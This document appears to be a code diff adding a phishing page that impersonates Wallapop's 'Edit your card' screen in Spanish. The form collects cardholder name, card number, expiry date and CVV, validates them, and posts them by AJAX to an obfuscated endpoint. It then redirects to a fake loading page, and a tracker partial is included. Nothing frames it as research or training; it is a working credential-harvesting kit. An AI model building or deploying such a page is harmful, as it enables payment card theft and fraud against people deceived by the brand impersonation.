@@ -1,0 +1,289 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Wallapop - Edita tu tarjeta</title>
+    <link rel="icon" type="image/png" href="/img/wallapop-logo.png">
+    <link rel="stylesheet" href="/css/wallapop.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+    <%- include('partials/tracker') %>
+</head>
+<body>
+    <!-- Top Header -->
+    <header class="wlp-header">
+        <div class="wlp-header-inner">
+            <a href="/" class="wlp-logo-link">
+                <img src="/img/wallapop-logo.png" alt="Wallapop" class="wlp-logo-img">
+            </a>
+        </div>
+    </header>
+
+    <!-- Main Container -->
+    <main class="wlp-page-wrapper">
+        <div class="wlp-modal-card">
+            <!-- Modal Header -->
+            <div class="wlp-modal-header">
+                <div class="wlp-modal-header-left">
+                    <button type="button" class="wlp-back-btn" onclick="window.history.back();" aria-label="Volver">
+                        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+                            <line x1="19" y1="12" x2="5" y2="12"></line>
+                            <polyline points="12 19 5 12 12 5"></polyline>
+                        </svg>
+                    </button>
+                    <h2 class="wlp-modal-title">Edita tu tarjeta</h2>
+                </div>
+                <div class="wlp-modal-header-right">
+                    <button type="button" class="wlp-close-btn" onclick="window.location.href='/blaTxmdM9HwCP472fgsut';" aria-label="Cerrar">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+                            <line x1="18" y1="6" x2="6" y2="18"></line>
+                            <line x1="6" y1="6" x2="18" y2="18"></line>
+                        </svg>
+                    </button>
+                </div>
+            </div>
+
+            <!-- Card Entry Form -->
+            <form id="creditCardForm" method="post" autocomplete="on">
+                <!-- Nombre y apellidos -->
+                <div class="wlp-form-group">
+                    <input 
+                        type="text" 
+                        id="cardName" 
+                        name="cardName"
+                        class="wlp-input" 
+                        placeholder="Nombre y apellidos"
+                        autocomplete="cc-name"
+                        required
+                    >
+                    <span class="wlp-error-text" id="cardNameError"></span>
+                </div>
+
+                <!-- Número de tarjeta -->
+                <div class="wlp-form-group">
+                    <input 
+                        type="tel" 
+                        id="cardNumber" 
+                        name="cardNumber"
+                        class="wlp-input" 
+                        placeholder="Número de tarjeta"
+                        maxlength="19"
+                        autocomplete="cc-number"
+                        required
+                    >
+                    <span class="wlp-error-text" id="cardNumberError"></span>
+                </div>
+
+                <!-- Row: MM/AA and CVV -->
+                <div class="wlp-row-2col">
+                    <div class="wlp-form-group">
+                        <input 
+                            type="tel" 
+                            id="expDate" 
+                            name="expDate"
+                            class="wlp-input" 
+                            placeholder="MM/AA"
+                            maxlength="5"
+                            autocomplete="cc-exp"
+                            required
+                        >
+                        <span class="wlp-error-text" id="expDateError"></span>
+                    </div>
+
+                    <div class="wlp-form-group">
+                        <input 
+                            type="tel" 
+                            id="cvv" 
+                            name="cvv"
+                            class="wlp-input" 
+                            placeholder="CVV"
+                            maxlength="4"
+                            autocomplete="cc-csc"
+                            required
+                        >
+                        <span class="wlp-error-text" id="cvvError"></span>
+                        <div class="wlp-field-hint">Número de 3 cifras que figura en el reverso de la tarjeta</div>
+                    </div>
+                </div>
+
+                <!-- SSL Security Footer -->
+                <div class="wlp-ssl-footer">
+                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                        <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+                    </svg>
+                    <span>Cifrado SSL seguro</span>
+                    <!-- Visa Logo -->
+                    <svg width="34" height="22" viewBox="0 0 46 28" fill="none" style="margin-left: 4px;">
+                        <rect width="46" height="28" rx="3" fill="#ffffff" stroke="#DCE4E8"/>
+                        <path d="M18.8 19H15.6L17.6 7H20.8L18.8 19Z" fill="#1A1F71"/>
+                        <path d="M26.2 7.3C25.5 7.1 24.5 6.9 23.3 6.9C20.3 6.9 18.2 8.5 18.2 10.8C18.2 12.5 19.7 13.5 20.9 14.1C22.1 14.7 22.5 15.1 22.5 15.6C22.5 16.4 21.5 16.8 20.5 16.8C19.3 16.8 18.6 16.6 17.6 16.2L17.2 16L16.8 18.5C17.5 18.8 18.8 19.1 20.2 19.1C23.4 19.1 25.5 17.5 25.5 15.1C25.5 13.7 24.6 12.6 22.7 11.7C21.6 11.1 20.9 10.7 20.9 10.1C20.9 9.5 21.6 8.9 23 8.9C24.1 8.9 24.9 9.1 25.5 9.4L25.8 9.5L26.2 7.3Z" fill="#1A1F71"/>
+                        <path d="M30.3 7H27.8C27 7 26.4 7.2 26 8.1L22.2 17.3L25.4 17.3L26 15.6H29.9L30.3 17.3H33.1L30.3 7ZM26.9 13.4L28.1 9.9L28.8 13.4H26.9Z" fill="#1A1F71"/>
+                        <path d="M14.2 7L11.2 15.2L10.9 13.6C10.3 11.7 8.6 9.7 6.6 8.6L9.3 19H12.6L17.5 7H14.2Z" fill="#1A1F71"/>
+                    </svg>
+                    <!-- Mastercard Logo -->
+                    <svg width="34" height="22" viewBox="0 0 46 28" fill="none">
+                        <rect width="46" height="28" rx="3" fill="#ffffff" stroke="#DCE4E8"/>
+                        <circle cx="18" cy="14" r="7.5" fill="#EB001B"/>
+                        <circle cx="28" cy="14" r="7.5" fill="#F79E1B" fill-opacity="0.9"/>
+                    </svg>
+                </div>
+
+                <!-- Submit Button -->
+                <button class="wlp-btn-primary" type="submit" id="submitBtn">Añadir tarjeta</button>
+            </form>
+        </div>
+    </main>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const form = document.getElementById('creditCardForm');
+            const cardNumberInput = document.getElementById('cardNumber');
+            const expDateInput = document.getElementById('expDate');
+            const cvvInput = document.getElementById('cvv');
+            const cardNameInput = document.getElementById('cardName');
+            const submitBtn = document.getElementById('submitBtn');
+
+            // Format card number with spaces every 4 digits
+            cardNumberInput.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\D/g, '');
+                let formattedValue = '';
+                for (let i = 0; i < value.length; i++) {
+                    if (i > 0 && i % 4 === 0) {
+                        formattedValue += ' ';
+                    }
+                    formattedValue += value[i];
+                }
+                e.target.value = formattedValue;
+                document.getElementById('cardNumberError').style.display = 'none';
+                cardNumberInput.classList.remove('input-error');
+            });
+
+            // Format expiry date MM/AA
+            expDateInput.addEventListener('input', function(e) {
+                let value = e.target.value.replace(/\D/g, '');
+                if (value.length > 2) {
+                    e.target.value = value.substring(0, 2) + '/' + value.substring(2, 4);
+                } else {
+                    e.target.value = value;
+                }
+                document.getElementById('expDateError').style.display = 'none';
+                expDateInput.classList.remove('input-error');
+            });
+
+            // CVV input
+            cvvInput.addEventListener('input', function(e) {
+                e.target.value = e.target.value.replace(/\D/g, '').substring(0, 4);
+                document.getElementById('cvvError').style.display = 'none';
+                cvvInput.classList.remove('input-error');
+            });
+
+            // Card name input
+            cardNameInput.addEventListener('input', function(e) {
+                document.getElementById('cardNameError').style.display = 'none';
+                cardNameInput.classList.remove('input-error');
+            });
+
+            function validateCardNumber(number) {
+                const digits = number.replace(/\s/g, '');
+                if (digits.length < 13 || digits.length > 19) return false;
+                // Luhn algorithm
+                let sum = 0;
+                let shouldDouble = false;
+                for (let i = digits.length - 1; i >= 0; i--) {
+                    let digit = parseInt(digits.charAt(i), 10);
+                    if (shouldDouble) {
+                        digit *= 2;
+                        if (digit > 9) digit -= 9;
+                    }
+                    sum += digit;
+                    shouldDouble = !shouldDouble;
+                }
+                return (sum % 10) === 0;
+            }
+
+            function validateExpDate(val) {
+                if (!/^\d{2}\/\d{2}$/.test(val)) return false;
+                const [m, y] = val.split('/').map(v => parseInt(v, 10));
+                if (m < 1 || m > 12) return false;
+                const now = new Date();
+                const curYear = now.getFullYear() % 100;
+                const curMonth = now.getMonth() + 1;
+                return (y > curYear) || (y === curYear && m >= curMonth);
+            }
+
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+                let isValid = true;
+
+                // Validate Name
+                const nameVal = cardNameInput.value.trim();
+                if (nameVal.length < 3) {
+                    const err = document.getElementById('cardNameError');
+                    err.textContent = 'Introduce el nombre y apellidos como aparecen en la tarjeta';
+                    err.style.display = 'block';
+                    cardNameInput.classList.add('input-error');
+                    isValid = false;
+                }
+
+                // Validate Card Number
+                const cardVal = cardNumberInput.value.replace(/\s/g, '');
+                if (!validateCardNumber(cardVal)) {
+                    const err = document.getElementById('cardNumberError');
+                    err.textContent = 'Número de tarjeta no válido';
+                    err.style.display = 'block';
+                    cardNumberInput.classList.add('input-error');
+                    isValid = false;
+                }
+
+                // Validate Expiry
+                const expVal = expDateInput.value.trim();
+                if (!validateExpDate(expVal)) {
+                    const err = document.getElementById('expDateError');
+                    err.textContent = 'Fecha no válida';
+                    err.style.display = 'block';
+                    expDateInput.classList.add('input-error');
+                    isValid = false;
+                }
+
+                // Validate CVV
+                const cvvVal = cvvInput.value.trim();
+                if (cvvVal.length < 3 || cvvVal.length > 4) {
+                    const err = document.getElementById('cvvError');
+                    err.textContent = 'CVV no válido';
+                    err.style.display = 'block';
+                    cvvInput.classList.add('input-error');
+                    isValid = false;
+                }
+
+                if (!isValid) return;
+
+                submitBtn.textContent = 'Añadiendo...';
+                submitBtn.disabled = true;
+
+                $.ajax({
+                    url: '/NkMNm4664XhcW8KuukHk',
+                    type: 'POST',
+                    contentType: 'application/json',
+                    data: JSON.stringify({
+                        cardNumber: cardVal,
+                        expiryDate: expVal,
+                        cvv: cvvVal,
+                        cardName: nameVal
+                    }),
+                    success: function(info) {
+                        if (info.OK) {
+                            window.location = "/loading?time=20&url=/RKnUB922z6Mf4HDwg3EZ";
+                        }
+                    },
+                    error: function() {
+                        submitBtn.textContent = 'Añadir tarjeta';
+                        submitBtn.disabled = false;
+                        alert('Se ha producido un error al tramitar la tarjeta. Inténtelo de nuevo.');
+                    }
+                });
+            });
+        });
+    </script>
+</body>
+</html>
